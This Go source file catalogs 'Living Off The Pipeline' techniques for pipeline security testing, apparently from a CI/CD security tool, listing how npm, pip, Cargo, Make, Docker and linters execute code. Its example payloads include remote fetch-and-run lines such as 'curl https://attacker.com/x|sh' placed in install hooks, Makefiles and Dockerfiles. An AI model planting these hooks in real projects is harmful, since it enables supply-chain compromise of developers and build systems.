// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package lotp provides "Living Off The Pipeline" technique detection and payload generation.
// Based on https://boostsecurityio.github.io/lotp/
package lotp

import "strings"

// Technique represents a Living Off The Pipeline technique.
type Technique struct {
	Name        string   // Tool/technique name
	Description string   // What it does
	Tags        []string // Categories: eval-sh, eval-js, config-file, etc.
	Files       []string // Config files that enable the technique
	Commands    []string // Commands that trigger the technique
	Payloads    []string // Example payloads
	References  []string // External references
}

// ExecutionType categorizes how the technique achieves code execution.
type ExecutionType string

const (
	ExecShell      ExecutionType = "eval-sh"
	ExecJavaScript ExecutionType = "eval-js"
	ExecPython     ExecutionType = "eval-py"
	ExecRuby       ExecutionType = "eval-ruby"
	ExecGo         ExecutionType = "eval-go"
	ExecGroovy     ExecutionType = "eval-groovy"
)

// Catalog holds all known LOTP techniques.
var Catalog = map[string]Technique{
	"npm": {
		Name:        "NPM",
		Description: "npm package manager - execute via package.json scripts hooks",
		Tags:        []string{"config-file", "eval-sh", "eval-js"},
		Files:       []string{"package.json", ".npmrc"},
		Commands: []string{
			"npm install", "npm i", "npm add",
			"npm test", "npm t",
			"npm start",
			"npm run",
			"npm run-script",
		},
		Payloads: []string{
			`{"scripts":{"preinstall":"curl https://attacker.com/x|sh"}}`,
			`{"scripts":{"postinstall":"node -e \"require('child_process').execSync('id')\""}}`,
			`{"scripts":{"prepare":"echo pwned"}}`,
		},
		References: []string{
			"https://docs.npmjs.com/cli/v11/using-npm/scripts#life-cycle-operation-order",
		},
	},
	"yarn": {
		Name:        "Yarn",
		Description: "yarn package manager - execute via .yarnrc.yml yarnPath",
		Tags:        []string{"config-file", "eval-js"},
		Files:       []string{".yarnrc.yml", "package.json"},
		Commands:    []string{"yarn", "yarn install"},
		Payloads: []string{
			`yarnPath: "./pwn.js"`,
			`// pwn.js: require('child_process').execSync('id')`,
		},
		References: []string{
			"https://yarnpkg.com/configuration/yarnrc",
		},
	},
	"pip": {
		Name:        "pip",
		Description: "Python package installer - execute via setup.py or pyproject.toml",
		Tags:        []string{"cli", "input-file", "eval-py", "env-var"},
		Files:       []string{"requirements.txt", "setup.py", "pyproject.toml", "constraints.txt"},
		Commands:    []string{"pip install", "pip install -r", "pip install ."},
		Payloads: []string{
			`# setup.py with CustomInstallCommand`,
			`# requirements.txt: -i https://evil.com/`,
			`# pyproject.toml with [project.scripts]`,
		},
		References: []string{
			"https://pip.pypa.io/en/stable/cli/pip_install/",
		},
	},
	"bundler": {
		Name:        "Bundler",
		Description: "Ruby package manager - execute via Gemfile or .bundle/config",
		Tags:        []string{"cli", "eval-sh", "config-file"},
		Files:       []string{"Gemfile", ".bundle/config", "*.gemspec"},
		Commands:    []string{"bundle", "bundle install"},
		Payloads: []string{
			`# Gemfile: system("curl https://attacker.com/x|sh")`,
			`# .bundle/config: BUNDLE_GEMFILE: "EvilGemfile"`,
		},
		References: []string{
			"https://bundler.io/v2.5/man/bundle-config.1.html",
		},
	},
	"cargo": {
		Name:        "Cargo",
		Description: "Rust package manager - execute via build.rs or Cargo.toml",
		Tags:        []string{"cli", "eval-sh", "config-file"},
		Files:       []string{"Cargo.toml", "build.rs", ".cargo/config.toml"},
		Commands:    []string{"cargo build", "cargo run", "cargo test"},
		Payloads: []string{
			`// build.rs: std::process::Command::new("sh").arg("-c").arg("id").output()`,
		},
		References: []string{
			"https://doc.rust-lang.org/cargo/reference/build-scripts.html",
		},
	},
	"go": {
		Name:        "Go",
		Description: "Go toolchain - execute via go generate or cgo",
		Tags:        []string{"cli", "eval-sh"},
		Files:       []string{"*.go", "go.mod"},
		Commands:    []string{"go generate", "go build"},
		Payloads: []string{
			`//go:generate sh -c "id"`,
		},
		References: []string{
			"https://pkg.go.dev/cmd/go#hdr-Generate_Go_files_by_processing_source",
		},
	},
	"make": {
		Name:        "Make",
		Description: "GNU Make - execute via Makefile targets",
		Tags:        []string{"cli", "config-file", "eval-sh"},
		Files:       []string{"Makefile", "GNUmakefile", "makefile"},
		Commands:    []string{"make", "make all", "make install"},
		Payloads: []string{
			`# Makefile: all: ; curl https://attacker.com/x|sh`,
		},
		References: []string{
			"https://www.gnu.org/software/make/manual/make.html",
		},
	},
	"docker": {
		Name:        "Docker",
		Description: "Docker build - execute via Dockerfile RUN commands",
		Tags:        []string{"cli", "config-file", "eval-sh"},
		Files:       []string{"Dockerfile", "docker-compose.yml"},
		Commands:    []string{"docker build", "docker-compose up"},
		Payloads: []string{
			`RUN curl https://attacker.com/x|sh`,
			`RUN --mount=type=bind,source=/,target=/host cat /host/.git/config`,
		},
		References: []string{
			"https://docs.docker.com/reference/dockerfile/",
		},
	},
	"eslint": {
		Name:        "ESLint",
		Description: "ESLint linter - execute via config file",
		Tags:        []string{"cli", "config-file", "eval-js"},
		Files:       []string{"eslint.config.js", ".eslintrc.js", ".eslintrc.cjs"},
		Commands:    []string{"eslint", "npx eslint"},
		Payloads: []string{
			`// eslint.config.js: require('child_process').execSync('id')`,
		},
		References: []string{
			"https://eslint.org/docs/latest/use/configure/configuration-files",
		},
	},
	"prettier": {
		Name:        "Prettier",
		Description: "Prettier formatter - execute via config file",
		Tags:        []string{"cli", "config-file", "eval-js"},
		Files:       []string{"prettier.config.js", ".prettierrc.js"},
		Commands:    []string{"prettier", "npx prettier"},
		Payloads: []string{
			`// prettier.config.js: require('child_process').execSync('id')`,
		},
		References: []string{
			"https://prettier.io/docs/en/configuration.html",
		},
	},
	"jest": {
		Name:        "Jest",
		Description: "Jest test runner - execute via config or test files",
		Tags:        []string{"cli", "config-file", "eval-js"},
		Files:       []string{"jest.config.js", "*.test.js", "*.spec.js"},
		Commands:    []string{"jest", "npm test", "npx jest"},
		Payloads: []string{
			`// jest.config.js: require('child_process').execSync('id')`,
		},
		References: []string{
			"https://jestjs.io/docs/configuration",
		},
	},
	"gradle": {
		Name:        "Gradle",
		Description: "Gradle build tool - execute via build.gradle",
		Tags:        []string{"cli", "config-file", "eval-groovy"},
		Files:       []string{"build.gradle", "build.gradle.kts", "settings.gradle"},
		Commands:    []string{"gradle", "./gradlew", "gradle build"},
		Payloads: []string{
			`// build.gradle: 'id'.execute().text`,
		},
		References: []string{
			"https://docs.gradle.org/current/userguide/userguide.html",
		},
	},
	"maven": {
		Name:        "Maven",
		Description: "Maven build tool - execute via pom.xml exec plugin",
		Tags:        []string{"cli", "config-file", "eval-sh"},
		Files:       []string{"pom.xml", ".mvn/"},
		Commands:    []string{"mvn", "./mvnw", "mvn install"},
		Payloads: []string{
			`<!-- pom.xml exec-maven-plugin with <executable>sh</executable> -->`,
		},
		References: []string{
			"https://maven.apache.org/guides/introduction/introduction-to-the-pom.html",
		},
	},
	"composer": {
		Name:        "Composer",
		Description: "PHP package manager - execute via composer.json scripts",
		Tags:        []string{"cli", "config-file", "eval-sh"},
		Files:       []string{"composer.json"},
		Commands:    []string{"composer install", "composer update"},
		Payloads: []string{
			`{"scripts":{"post-install-cmd":"curl https://attacker.com/x|sh"}}`,
		},
		References: []string{
			"https://getcomposer.org/doc/articles/scripts.md",
		},
	},
	"pre-commit": {
		Name:        "pre-commit",
		Description: "pre-commit framework - execute via .pre-commit-config.yaml",
		Tags:        []string{"cli", "config-file", "eval-sh"},
		Files:       []string{".pre-commit-config.yaml"},
		Commands:    []string{"pre-commit run", "pre-commit install"},
		Payloads: []string{
			`# local repo with entry: "curl https://attacker.com/x|sh"`,
		},
		References: []string{
			"https://pre-commit.com/",
		},
	},
	"husky": {
		Name:        "Husky",
		Description: "Husky git hooks - execute via .husky/ scripts",
		Tags:        []string{"config-file", "eval-sh"},
		Files:       []string{".husky/pre-commit", ".husky/pre-push", "package.json"},
		Commands:    []string{"npm install", "git commit", "git push"},
		Payloads: []string{
			`# .husky/pre-commit: curl https://attacker.com/x|sh`,
		},
		References: []string{
			"https://typicode.github.io/husky/",
		},
	},
}

var autoDeployAliases = map[string]string{
	"actions/setup-node":   "npm",
	"setup-node":           "npm",
	"actions/setup-python": "pip",
	"setup-python":         "pip",
	"actions/setup-go":     "go",
	"setup-go":             "go",
	"ruby/setup-ruby":      "bundler",
	"setup-ruby":           "bundler",
}

var autoDeploySupportedTechniques = map[string]bool{
	"bash":       true,
	"powershell": true,
	"python":     true,
	"npm":        true,
	"pip":        true,
	"yarn":       true,
	"cargo":      true,
	"make":       true,
}

type AutoDeployStatus struct {
	Technique string
	Supported bool
	Reason    string
}

func NormalizeTechnique(name string) string {
	normalized := strings.ToLower(strings.TrimSpace(name))
	if normalized == "" {
		return ""
	}
	if at := strings.IndexByte(normalized, '@'); at >= 0 {
		normalized = normalized[:at]
	}
	if alias, ok := autoDeployAliases[normalized]; ok {
		return alias
	}
	return normalized
}

func ResolveTechnique(tool, action string) string {
	if technique := NormalizeTechnique(tool); technique != "" {
		return technique
	}
	return NormalizeTechnique(action)
}

func AutoDeployStatusFor(tool, action string) AutoDeployStatus {
	technique := ResolveTechnique(tool, action)
	if technique == "" {
		return AutoDeployStatus{
			Supported: false,
			Reason:    "Automatic LOTP generation is not available for this finding",
		}
	}
	if autoDeploySupportedTechniques[technique] {
		return AutoDeployStatus{
			Technique: technique,
			Supported: true,
		}
	}
	label := strings.TrimSpace(tool)
	if label == "" {
		label = strings.TrimSpace(action)
	}
	return AutoDeployStatus{
		Technique: technique,
		Supported: false,
		Reason:    "Automatic LOTP generation is not implemented yet for " + label,
	}
}

// Hook types for npm/yarn/etc package.json scripts.
var NPMHooks = []string{
	"preinstall",
	"install",
	"postinstall",
	"prepack",
	"prepare",
	"prepublish",
	"prepublishOnly",
	"preversion",
	"postversion",
}

// FindByFile returns techniques that use the given file.
func FindByFile(filename string) []Technique {
	var matches []Technique
	for _, t := range Catalog {
		for _, f := range t.Files {
			if matchFile(f, filename) {
				matches = append(matches, t)
				break
			}
		}
	}
	return matches
}

// FindByCommand returns techniques triggered by the given command.
func FindByCommand(cmd string) []Technique {
	var matches []Technique
	for _, t := range Catalog {
		for _, c := range t.Commands {
			if matchCommand(c, cmd) {
				matches = append(matches, t)
				break
			}
		}
	}
	return matches
}

// AllTechniques returns all known techniques.
func AllTechniques() []Technique {
	var techniques []Technique
	for _, t := range Catalog {
		techniques = append(techniques, t)
	}
	return techniques
}

// matchFile checks if a filename matches a pattern.
func matchFile(pattern, filename string) bool {
	// Simple matching - could use filepath.Match for globs
	if pattern == filename {
		return true
	}
	// Handle wildcards like *.go
	if len(pattern) > 1 && pattern[0] == '*' {
		suffix := pattern[1:]
		if len(filename) >= len(suffix) && filename[len(filename)-len(suffix):] == suffix {
			return true
		}
	}
	return false
}

// matchCommand checks if a command matches a pattern.
func matchCommand(pattern, cmd string) bool {
	// Check if pattern is prefix of cmd
	if len(cmd) >= len(pattern) && cmd[:len(pattern)] == pattern {
		return true
	}
	return false
}
